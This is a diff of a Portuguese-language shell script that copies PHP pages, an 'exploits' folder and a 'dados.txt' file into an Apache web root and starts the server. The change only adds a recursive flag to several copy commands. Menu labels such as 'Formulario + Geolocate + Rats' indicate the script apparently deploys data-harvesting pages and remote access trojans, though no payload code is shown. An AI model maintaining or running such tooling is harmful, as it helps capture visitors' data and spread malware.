@@ -162,7 +162,7 @@ process_model_choice() {
             echo -e "${GREEN}Você escolheu: Standart${NC}"
             cp  "$type_egs/index.php" "$apache"
             echo "[**Script carregado com sucesso no apache**]"
-            cp  "$type_egs/exploits/" "$apache"
+            cp -r "$type_egs/exploits/" "$apache"
             echo "[**Exploits Carregados com sucesso no apache**]"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
@@ -253,7 +253,7 @@ process_model_choice() {
         7)
             echo -e "${GREEN}Você escolheu: Formulario + Geolocate + Rats${NC}"
             cp  "$type_egs/7.php" "$apache"
-            cp  "$type_egs/exploits/" "$apache"
+            cp  -r "$type_egs/exploits/" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
             chmod +x $apache/* #Nivel de permissão de arquivos
@@ -333,7 +333,7 @@ process_model_choice() {
             cp  "$type_egs/12.php" "$apache"
             echo "[**Script carregado com sucesso no apache**]"
             chmod +x $apache/* #Nivel de permissão de arquivos
-            cp  "$type_egs/exploits/" "$apache"
+            cp -r "$type_egs/exploits/" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
             systemctl start apache2
